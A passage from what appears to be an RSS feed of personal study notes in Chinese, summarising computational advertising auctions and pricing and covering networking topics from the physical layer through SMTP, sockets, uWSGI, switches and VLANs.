$$eCPM = r(a,u, c) = \mu(a, u, c) \cdot v(a, u, c)$$，其中 $$\mu$$ 表示点击率，v 表示单词点击带来的收益；</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E5%B9%BF%E5%91%8A/5.%E7%AB%9E%E4%BB%B7%E5%B9%BF%E5%91%8A/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E5%B9%BF%E5%91%8A/5.%E7%AB%9E%E4%BB%B7%E5%B9%BF%E5%91%8A/</guid><description>竞价广告 # 位置拍卖 # 如何设计位置拍卖问题中的一些重要机制，往往影响整个市场的收益、稳定性、公平性，常见的机制包括“定价”、“市场保留价”、“价格挤压”等。
市场保留价（Market Reserve Price, MRP） # 竞价广告市场通常要设置一个赢得拍卖位置的最低价格，广告主只有在高于这个价格时才能获得竞价机会，这个价格就称之为市场保留价 MRP。
市场保留价的设置有两种方式：
对这个整个竞价市场采用同样的 MRP； 根据不同的标的物（比如搜索广告里面的关键词）的特性设置不同的 MRP； 无论是哪种设置方式，基本原理都是：
eCPM 分布 $$\rightarrow$$ 填充率没有明显下降的 CPM-MRP $$\rightarrow$$ 根据质量倒推 CPC-MRP； 定价问题 # 纳什均衡（Nash Equilibrium）状态：每个广告商都通过出价得到最符合自己利益的位置。
GSP 定价（广义第二高价）：最常见的定价策略，向最高出价收取其下一位广告主的出价；
VCG 定价（Vickrey-Clarke-Groves 研究得到的社会福利最优定价策略）：
它的基本思想是对应赢得某个广告位的广告主，它付出的成本应该等于他占据这个位置给其他市场参与者带来的价值损害。 具体的说，某个位置 s 的定价为：$$\displaystyle q_s = \sum_{t \gt s} (\mu_{t - 1} - \mu_t) \cdot v_{t}$$ Myerson 最优拍卖：
最优拍卖问题（广告平台通过定价使平台的价值最大）的最优解。 参考知乎文章；参考课程 Stanford Algorithmic Game Theory CS364A； 价格挤压 # 在 CPC 结算的广告产品中，eCPM 可以表示为点击率和出价的乘积，即 $$r = \mu \cdot bid_{CPC}$$。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E5%B9%BF%E5%91%8A/9.%E8%AE%A1%E7%AE%97%E5%B9%BF%E5%91%8A%E6%8A%80%E6%9C%AF%E6%A6%82%E8%A7%88/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E5%B9%BF%E5%91%8A/9.%E8%AE%A1%E7%AE%97%E5%B9%BF%E5%91%8A%E6%8A%80%E6%9C%AF%E6%A6%82%E8%A7%88/</guid><description>计算广告技术概览 # 个性化系统框架 # 一般的个性化系统主要由以下 4 个主体部分组成：
Online Serving Engine：用于响应实时请求，完成决策的“在线投放引擎”； Offline Distributed Computing：离线的分布式计算数据处理平台； Stream Computing：在线实时反馈的流计算平台； Data Highway：连接和转运以上三个部分数据流的数据高速公路； 广告系统优化目标 # 广告系统的核心优化目标是下面的回归值：
$$\displaystyle \hat{a_{1,\dots, T}} = max_{a_1, \dots, T} \sum_{i=1}^{T}{r(a_i, u_i, c_i) - q(a_i, u_i, c_i)}$$ 其中：$$r(a_i, u_i, c_i) = eCPM = \mu(a_i, u_i, c_i) * v(a_i, u_i, c_i)$$ 使得约束满足：$$\displaystyle \sum_{i = 1}^T d(a_i, u_i, c_i, k) \le D_k, \forall k$$ 变量含义：
$$a$$：是指广告产品的利润；$$r$$：表示单词展示的预估收益；$$q$$：是指单次展示广告的成本； $$\mu$$：是指点击率；$$v$$：表示的点击价值； $$k$$：参与广告活动的单个广告主；$$D_k$$：表示这个广告主的成本约束； 计算广告系统架构 # 广告系统架构与“个性化推荐系统架构”类似。它由以下几个部分组成：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/1.%E7%89%A9%E7%90%86%E5%B1%82/%E7%89%A9%E7%90%86%E5%B1%82/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/1.%E7%89%A9%E7%90%86%E5%B1%82/%E7%89%A9%E7%90%86%E5%B1%82/</guid><description>物理层 # 常见的传输介质 # 引导型传输媒介 # 双绞线 # 即常用的网线，最常用的 UTP 是 5 类线 CTA5：
有许多种不同的标准适用于这种基于的铜线的物理介质。最广泛使用的包括 10BASE-T、100BASE-TX 和1000BASE-T (吉比特以太网), 速率分别为10 Mbit/s, 100 Mbit/s, and 1000 Mbit/s (1 Gbit/s)。
双绞线有一个“无法逾越”的“100米”传输距离。无论是 10M 传输速率的三类双绞线，还是 100M 传输速率的五类双绞线，甚至 1000M 传输速率的六类双绞线，最远有效传输距离为 100 米。
同轴电缆 # 同轴电缆具有很好的抗干扰特性，被广泛用于传输较高速率的数据：
光缆 # 通信容量非常大、传输损耗小，中继距离长、抗雷电和电磁干扰性能好、无串音干扰，保密性好、体积小，重量轻。
光纤由三层材料组成，中心高折射率玻璃芯，中间为低折射率硅玻璃包层，最外是加强用的树脂涂层。 包层的材料一般用纯二氧化硅，也有掺极微量的三氧化二硼。掺杂的作用是降低材料的光折射率。 涂层是用来保护光纤不受外来的损害，增加光纤的机械强度。 非引导型传输媒介 # 协议 # 10BASE-T # 10BASE－T 是双绞线以太网，1990年由IEEE新认可的，编号为 IEEE802.3i，T 表示采用双绞线，现 10BASE-T 采用的是无屏蔽双绞线（UTP）。
数据传输速率 10Mbps基带传输，10表示10兆比特每秒，Bas e表示基带传输，T 代表双绞线（F 表示光纤）</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/2.%E9%93%BE%E8%B7%AF%E5%B1%82/%E9%93%BE%E8%B7%AF%E5%B1%82/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/2.%E9%93%BE%E8%B7%AF%E5%B1%82/%E9%93%BE%E8%B7%AF%E5%B1%82/</guid><description>学习地址：
《计算机网络：自顶向下的方法》 链路层 # 概念 # 结点（node）：运行链路层协议的任何设备（比如：主机、路由器、交换机和 WiFi 接入点）。
链路（link）：沿着通信路径连接响铃结点的通信信道。
链路层协议能提供可能的服务包括：
成帧（framing）：一个帧由一个数据字段（网络层数据报）和若干个首部字段组成。 链路接入：媒体访问控制（Medium Access Control, MAC）协议规定了帧在链路上传输的规则。 可靠交付：当链路层协议提供可靠交付服务时，它保证无差错地经链路层移动每个数据报网络。 差错检测和纠正 链路层的主体部分是在网络适配器（network adapter）中实现的，网络适配器有时也称作网络接口卡（Network Interface Card, NIC）。
位于网络适配器核心的是链路层控制器，该控制器通常是一个实现了许多链路层服务的专用芯片（例如，Intel 的 8254x 控制器实现了以太网协议，Atheros AR5006 控制器实现了 802.11 WiFi 协议）
差错检测和纠正技术 # 奇偶校验 # 差错检测最简单的方式就是奇偶校验位（parity bit）。实现方式：
发送方需要包含一个附加的比特位，使得所有比特中，1 的总数总是一个偶数。 接收方只要检测到奇数个值位 1 的比特位，则传输信息出现了差错。 使用二维奇偶校验（two-dimensional parity）方案，包含值改变的列和行的校验值都将会差错，因此可以予以纠正，如下：
接收方检测和纠正差错的能力被称为前向纠正（Forward Error Correction, FEC）。
检验和 # 因特网检验和（Internet checksum）就基于这种方法，即数据的字节作为 16 比特的整数对待并求和，这个和的反码形成了携带在报文段首部的因特网检验和。
循环冗余检测 # 循环冗余检测（Cyclic Redundancy Check, CRC）编码又被称作多项式编码（polynomial code），因为该编码能够将要发送的比特串看作为系数是 0 和 1 的多项式，比特串的操作被解释位多项式算术。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/3.%E7%BD%91%E7%BB%9C%E5%B1%82/%E7%BD%91%E7%BB%9C%E5%B1%82/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/3.%E7%BD%91%E7%BB%9C%E5%B1%82/%E7%BD%91%E7%BB%9C%E5%B1%82/</guid><description>学习地址：
《计算机网络 自顶向下方法》 原书地址：https://www.net.t-labs.tu-berlin.de/teaching/computer_networking/ 网络层 # 概念 # 转发和路由选择 # 网络层的作用从表面上看极为简单，需要两种重要的网络层功能：
转发：当一个分组到达路由器的一条输入链路时，路由器必须将该分组移动到合适的输入链路。 路由选择：当分组发送方流向接收方时，网络层必须决定这些分组所采用的路由或路径。计算这些路径的算法被称作路由选择算法（routing algorithm）。 转发表（forwarding table）：
路由器通过检查到达分组首部字段的值来转发分组，然后使用该值在路由器的转发表中索引查询。 网络服务模型 # 网络服务模型（network service model）定义了分组在发送与接收端系统之间的端到端运输特性：
一个分组的需求特性： 确保交付：该服务确保分组将最终到达其目的地。 具有时延上界的确保交付：在特定的时延上限内交付（如 100ms） 分组流需要提供下列服务： 有序分组交付：确保分组以它们发送的顺序到达目的地。 确保最小带宽：只要发送主机低于给定比特率的速率传输比特，则满足 确保交付 和 在时延上界内确保交付 的特性。 确保最大时延抖动：确保位于发送方发送两个相继分组之间的时间量等于目的地接收到它们之间的时间量 安全性服务：使用仅由源和目的主机所知晓的一个秘密回话密钥。 下面表格给出了三种服务模型：
网络体系结构 服务模型 带宽保证 无丢包保证 有序 定时 拥塞指示 因特网 尽力而为 无 无 任何可能 不维护 无 ATM CBR 保证恒定速率 是 有序 维护 不出现拥塞 ATM ABR 保证最小速率 无 有序 不维护 提供拥塞指示 虚电路和数据包网络 # 仅在网络层提供连接服务的计算机网络称为虚电路网络（Virtual-Circuit VC）。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/4.%E4%BC%A0%E8%BE%93%E5%B1%82/ssl/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/4.%E4%BC%A0%E8%BE%93%E5%B1%82/ssl/</guid><description>学习网址：
https://www.cnblogs.com/bhlsheji/p/4586597.html SSL # 协议工作过程 # 分层结构 # SSL 位于应用层和传输层之间，它能够为不论什么基于 TCP 等可靠连接的应用层协议提供安全性保证。SSL 协议本身分为两层：
上层为 SSL 握手协议 (SSL handshake protocol)、SSLpassword 变化协议 (SSL change cipher spec protocol) 和 SSL 警告协议 (SSL alert protocol)。
底层为 SSL 记录协议 (SSL record protocol)。
当中：
SSL 握手协议：是 SSL 协议很重要的组成部分。用来协商通信过程中使用的加密套件(加密算法、密钥交换算法和 MAC 算法等)、在 server 和 client 之间安全地交换密钥、实现 server 和 client 的身份验证。
SSLpassword 变化协议：client 和 server 端通过 password 变化协议通知对端。随后的报文都将使用新协商的加密套件和密钥进行保护和传输。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/4.%E4%BC%A0%E8%BE%93%E5%B1%82/tcp/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/4.%E4%BC%A0%E8%BE%93%E5%B1%82/tcp/</guid><description> 学习网址：
https://blog.csdn.net/a19881029/article/details/38091243</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/4.%E4%BC%A0%E8%BE%93%E5%B1%82/%E8%BF%90%E8%BE%93%E5%B1%82/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/4.%E4%BC%A0%E8%BE%93%E5%B1%82/%E8%BF%90%E8%BE%93%E5%B1%82/</guid><description>学习地址：
《计算机网路，自顶向下的方法》 运输层 # 无连接运输：UDP # UDP stands for User Data Protocol.
报文结构 # UDP 首部只有四个字段，每个字段首部由两个字节组成。
UDP 的报文段结构如下图所示，它由 RFC 768 定义：
UDP 校验和 # 伪协议头：
用于计算 checksum 包括源 IP 地址和目的 IP 地址。 NOTICE：
UDP 校验和是可选项，IPv6 中将变成强制性的（UDP 校验和覆盖的范围超出了 UDP 数据报本身）
使用伪首部的目的是检验 UDP 数据报是否真正到达目的地。正确的目的地包括了特定的主机和该主机上特定的端口
伪首部不随用户数据报一起传输
接收方需自己形成伪首部进行校验
伪首部的使用破坏了层次划分的基本前提，即每一层的功能独立
目的主机的 IP 地址 UDP 通常知道，源 IP 的使用需要通过路由选择决定</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/5.%E5%BA%94%E7%94%A8%E5%B1%82/ftp/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/5.%E5%BA%94%E7%94%A8%E5%B1%82/ftp/</guid><description>学习网址：
https://www.cnblogs.com/luoxn28/p/5585458.html https://en.wikipedia.org/wiki/File_Transfer_Protocol 文件传输协议 FTP # 文件传输协议有基于 TCP 的FTP和基于UDP 的简单文件传输协议 TFTP，它们都是文件共享协议中的一大类，即复制整个文件，其特点是：若要存取一个文件，就必须先获得一个本地的文件副本。如果要修改文件，只能对文件的副本进行修改，然后再将修改后的文件传回到原节点。
基本工作原理 # FTP 使用客户端-服务器模型，一个 FTP 服务器进程可以为多个客户提供服务。
FTP 有两大组成部分：
一个主进程，负责接受新的请求，其工作步骤如下： 打开众所周知的 21 端口，使客户进行可以连接上； 等待客户进程发送连接请求； 启动从属进程处理客户进程发送的连接请求，从属进程处理完请求后结束，从属进程在运行期间可能根据需要可创建其他一些子进程； 回到等待状态，继续接受其他客户进程发起的请求，主进程与从属进程的处理是并发进行的。 若干个从属进程，负责处理单个请求。 FTP 控制连接在整个会话期间都保持打开，只用来发送连接/传送请求。当客户进程向服务器发送连接请求时，寻找连接服务器进程的熟知端口 21，同时还要告诉服务器进程自己的另一个端口号码，用于建立数据传送连接。接着，服务器进程用自己传送数据的熟知端口 20 与客户进程所提供的端口号码建立数据传送连接，FTP使用了2个不同的端口号，所以数据连接和控制连接不会混乱。
Communication and data transfer # Working Mode # FTP may run in active or passive mode, which determines how the data connection is established:
In active mode, the client starts listening for incoming data connections from the server on port M.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/5.%E5%BA%94%E7%94%A8%E5%B1%82/ntp/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/5.%E5%BA%94%E7%94%A8%E5%B1%82/ntp/</guid><description>学习地址：
https://www.tecmint.com/synchronize-time-with-ntp-in-linux/ NTP # Protocol # The Network Time Protocol (NTP) is a protocol used to synchronize computer system clock automatically over a networks. The machine can have the system clock use Coordinated Universal Time (UTC) rather than local time.
ntpdate # The most common method to sync system time over a network in Linux desktops or servers is by executing the ntpdate command which can set your system time from an NTP time server.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/5.%E5%BA%94%E7%94%A8%E5%B1%82/smtp/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/5.%E5%BA%94%E7%94%A8%E5%B1%82/smtp/</guid><description>学习地址：
https://blog.csdn.net/kerry0071/article/details/28604267 http://coolnull.com/3055.html SMTP 协议 # 简介 # SMTP 称为简单邮件传输协议（Simple Mail Transfer Protocal），目标是向用户提供高效、可靠的邮件传输。它的一个重要特点是它能够在传送中接力传送邮件，即邮件可以通过不同网络上的主机接力式传送。
通常它工作在两种情况下：
邮件从客户机传输到服务器； 从某一个服务器传输到另一个服务器。 SMTP 是一个请求/响应协议，它监听 25 号端口，用于接收用户的 Mail 请求，并与远端 Mail 服务器建立 SMTP 连接。
工作机制 # 发送 SMTP 在接收到用户的邮件请求后，判断此邮件是否为本地邮件，若是直接投送到用户的邮箱，否则向 DNS 查询远端邮件服务器的 MX 记录，并建立与远端接收 SMTP 之间的一个双向传送通道，此后 SMTP 命令由发送 SMTP 发出，由接收 SMTP 接收，而应答则反方向传送。一旦传送通道建立，SMTP 发送者发送 MAIL 命令指明邮件发送者。
如果 SMTP 接收者可以接收邮件则返回 OK 应答。SMTP 发送者再发出 RCPT 命令确认邮件是否接收到。如果 SMTP 接收者接收，则返回 OK 应答；如果不能接收到，则发出拒绝接收应答（但不中止整个邮件操作），双方将如此反复多次。当接收者收到全部邮件后会接收到特别的序列，入伏哦接收者成功处理了邮件，则返回 OK 应答。
连接和发送过程 # 建立 TCP 连接。 客户端发送 HELO 命令以标识发件人自己的身份。 客户端发送 MAIL 命令，服务器端以 OK 作为响应，表示准备接收。 客户端发送 RCPT 命令以标识该邮件的计划接收人，可以有多个 RECPT 行，服务器端则表示是否愿意为接收人接收邮件。 客户端发送 DATA 命令，发送邮件，最后以只含有 .</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/5.%E5%BA%94%E7%94%A8%E5%B1%82/socket/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/5.%E5%BA%94%E7%94%A8%E5%B1%82/socket/</guid><description>学习网址：
https://www.geeksforgeeks.org/socket-programming-cc/ Socket Programming # 什么是 socket 编程？
Socket programming is a way of connecting two nodes on a network to communicate with each other. One socket(node) listens on a particular port at an IP, while other socket reaches out to the other to form a connection. Server forms the listener socket while client reaches out to the server.
服务端 # 示例代码 # // Server side C/C++ program to demonstrate Socket programming #include &amp;lt;unistd.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/5.%E5%BA%94%E7%94%A8%E5%B1%82/uwsgi/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/5.%E5%BA%94%E7%94%A8%E5%B1%82/uwsgi/</guid><description>在搭建 NKCTF 网站的时候学习到的有关 UWSGI 的知识
WSGI协议 # 几个概念：
WSGI：Web Server Gateway Interface。WSGI 不是服务器，python 模块，框架，API 或者任何软件，只是一种规范，描述 web server 如何与 web application 通信的规范。 WSGI server 负责从客户端接收请求，将 request 转发给 application，将 application 返回的 response 返回给客户端； WSGI application 接收由 server 转发的 request，处理请求，并将处理结果返回给 server。application 中可以包括多个栈式的中间件(middlewares)，这些中间件需要同时实现 server 与 application，因此可以在 WSGI 服务器与 WSGI 应用之间起调节作用：对服务器来说，中间件扮演应用程序，对应用程序来说，中间件扮演服务器。 **uwsgi：**与 WSGI 一样是一种通信协议，是 uWSGI 服务器的独占协议，用于定义传输信息的类型，每一个 uwsgi packet 前 4byte 为传输信息类型的描述，与WSGI协议是两种东西，据说该协议是 fcgi 协议的10倍快。（快速通用网关接口 → Fast Common Gateway Interface／FastCGI）是一种让交互程序与Web服务器通信的协议） **uWSGI：**是一个 web 服务器，实现了 WSGI 协议、uwsgi 协议、http 协议等。 WSGI协议的实现 # 以 Django 为例，分析一下 WSGI 协议的具体实现过程：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E5%9F%BA%E6%9C%AC%E5%8A%9F/1.%E7%BD%91%E7%BB%9C%E4%BC%A0%E8%BE%93/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E5%9F%BA%E6%9C%AC%E5%8A%9F/1.%E7%BD%91%E7%BB%9C%E4%BC%A0%E8%BE%93/</guid><description>学习网址：https://www.kancloud.cn/wizardforcel/network-basic/135483
网络传输 # 传输流程 # 下图显示了一个网络服务器向客户端传送数据的完整过程：
传送的数据是网络服务器的HTML页面。
应用层协议 HTTP 报文头添加到 HTML 数据之前生成报文。报文头信息包括：服务器所使用的HTTP版本，以及表明它包含发给网络客户端信息的状态编码。
HTTP 应用层协议将 HTML 格式的网页数据发送给传输层。TCP 传输层用于管理网络服务器和客户端之间的 TCP 会话。
IP 信息添加到 TCP 信息之前。IP 指定适当的源和目的 IP 地址。这些信息就构成了 IP 报文。
以太网协议添加到IP报文的两端之后，就形成了数据链路帧。上述帧发送至通向网络客户端的路径上的最近一个路由器。路由器移除以太网信息，观察IP报文，判定最佳路径，将报文插入一个新的帧，并发送至目标路径上下一个相邻路由器。每一个路由器在转发之前都移除并添加新的数据链路层信息。
数据通过互联网络传输，互联网络包含媒介和中间设备。
客户端接收到包含数据的数据链路帧，处理各层协议头，之后以添加时相反的顺序移除协议头。首先处理并移除以太网信息 → 之后是 IP 协议信息 → 接下来 TCP 信息 → 最后是 HTTP 信息。
之后，将网页信息传递给客户端网页浏览器软件。
传输概念 # 数据封装 # 消息要在网络中传输，必须对它进行编码，以特定的格式进行封装，同时需要适当地封装以足够的控制和地址信息，以使它能够从发送方移动到接收方。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E5%9F%BA%E6%9C%AC%E5%8A%9F/2.%E4%BA%A4%E6%8D%A2%E6%9C%BA/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E5%9F%BA%E6%9C%AC%E5%8A%9F/2.%E4%BA%A4%E6%8D%A2%E6%9C%BA/</guid><description>学习网址：https://www.kancloud.cn/wizardforcel/network-basic/135484
交换机 # 帧转发技术
交换概念 # 交换指基于以下两条准则做出决定的设备：
进入（ingress）端口 目的地址 交换机通过以太网帧中的源 MAC 地址与目的 MAC 地址，从源设备接收到帧并快速发往目的地址。
术语 ingress 用于描述帧通过特定端口进入设备，egress 用于描述帧通过特定端口离开设备。
LAN（Local Area Network，局域网）交换机维护一张表，通过这张表决定如何转发数据流。LAN 交换机唯一智能部分是利用这张表基于消息的进入端口和目的地址来转发。
一个 LAN 交换机中只有一张定义了地址和端口的主交换表；因此，无论进入端口如何，同一目的地址的消息永远从同一出口离开。
MAC 地址表动态更新 # 一个交换机要知道使用哪一个端口进行传送帧，首先必须知道各个端口有哪些设备。
交换机使用 MAC 表的方式完成，它建立起一张 MAC 地址表，内容可寻址寄存表（CAM）。交换机将连接到它的端口的设备的 MAC 地址记录到 MAC 表中，然后利用表中信息将帧发送至输出端口设备，该端口已指定给该设备。
交换机操作模式的一句简单的话是：交换机学习“源地址”，基于“目的地址”转发。以下步骤描述了更新 MAC 地址表的方法：
交换机在 port1 接收到来自 PC1 的帧。 交换机检查源 MAC 地址并与 MAC 地址表相比较： 如果地址不在表中，则将交换机在 MAC 地址表中将 PC 1 的源 MAC 地址关联到进入端口（port 1） 如果地址已经存在该表中，则交换机重置老化计时器。通常一个表项会保持 5 分钟。 交换机记录源地址信息后，检查目的地址：如果目的 MAC 地址不在表项中或如果它是一个广播 MAC 地址，则交换机把该帧泛洪（flood）至除了进入端口以外的所有端口。（如果在表项中则可以直接正常通信） 目标设备（PC 3）返回目的地址为 PC 1 的单播帧。 交换机地址表中输入 PC 3 的源 MAC 地址以及进入的端口号。 交换机现在可以在源 PC 1 和目标设备 PC 3 之间传送帧而无需泛洪。 交换机的转发方式 # 存储转发交换 Store-and-Forward # 运行在存储转发模式下的交换机在发送信息前要把整帧数据读入内存并检查其正确性。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E5%9F%BA%E6%9C%AC%E5%8A%9F/3.vlan%E4%B8%8Etrunk/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E5%9F%BA%E6%9C%AC%E5%8A%9F/3.vlan%E4%B8%8Etrunk/</guid><description>学习地址：
https://community.emc.com/message/834012#834012 VLAN # 概念 # 虚拟局域网（VLAN）是一组逻辑上的设备和用户，这些设备和用户并不受物理位置的限制，可以根据功能、部门及应用等因素将它们组织起来，相互之间的通信就好像它们在同一个网段中一样，由此得名虚拟局域网。
VLAN 是一种比较新的技术，工作在 OSI 参考模型的第 2 层和第 3 层，一个 VLAN 就是一个广播域，VLAN 之间的通信是通过第3层的路由器来完成的。
部署结构 # 下图显示了一个常规的部署，左边这张图节点连接到交换机，交换机连接到路由器。所有的节点都位于同一 IP 网络，因为他们都连接到路由器同一接口。
